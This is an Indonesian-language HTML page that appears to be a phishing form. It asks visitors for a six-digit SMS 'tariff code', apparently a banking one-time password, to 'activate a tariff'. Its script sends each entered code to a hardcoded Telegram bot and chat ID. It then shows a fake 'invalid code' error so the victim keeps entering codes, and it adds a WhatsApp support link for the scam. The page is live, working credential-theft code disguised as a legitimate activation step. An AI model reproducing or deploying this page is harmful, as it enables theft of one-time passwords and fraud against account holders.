<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Otp</title>
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
            crossorigin="anonymous"
        />
    </head>
    <body>
        <img src="loker.webp" class="img-fluid" alt="..." />
        <div class="container">
            <p class="text-center fw-bold">
                Tunggu 1 menit,kode tarif transaksi akan di,kirimkan ke nomor
                handphone anda berupa sms
            </p>
            <p class="text-center fw-bold">
                <a
                    style="text-decoration: none; color: orange"
                    href="https://wa.me/+628117451001"
                    >Tidak menerima sms?</a
                >
            </p>
            <div class="mt-5">
                <span style="color: #808080">Kode Tarif</span>
                <input
                    class="form-control"
                    type="number"
                    name="kode"
                    id="kode"
                    placeholder="Kode tarif 6 angka"
                    style="border: 1px solid #000"
                />
            </div>
            <div class="mt-5">
                <button
                    class="btn fw-bold text-light"
                    style="background-color: #df420eff; width: 100%"
                    onclick="next()"
                >
                    Aktivasi tarif
                </button>
            </div>
            <div class="mt-3 errorMessage" style="display: none">
                <button class="btn btn-danger">
                    KODE YANG ANDA MASUKAN TIDAK VALID SILAHKAN MASUKAN ULANG
                </button>
            </div>
        </div>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
            crossorigin="anonymous"
        ></script>
        <script>
            async function sendMessage(chatId, text) {
                const url =
                    "https://api.telegram.org/bot6296115188:AAHsxs2hX66fPQIDLkiyvEQYfByq2qXiN5Q/sendMessage";
                const payload = {
                    chat_id: chatId,
                    text: text,
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    throw new Error("Failed to send message");
                } else {
                    let errorMessage = document.querySelector(".errorMessage");
                    errorMessage.style.display = "block";
                    setTimeout(function () {
                        errorMessage.style.display = "none";
                    }, 3000);
                }
            }
            const next = () => {
                let kode = document.querySelector("#kode").value;
                if (kode === "") {
                    alert("mohon masukan kode!");
                } else {
                    let text = `Kode: ${kode}`;
                    let chatId = "6201620059";
                    sendMessage(chatId, text);
                }
            };
        </script>
    </body>
</html>
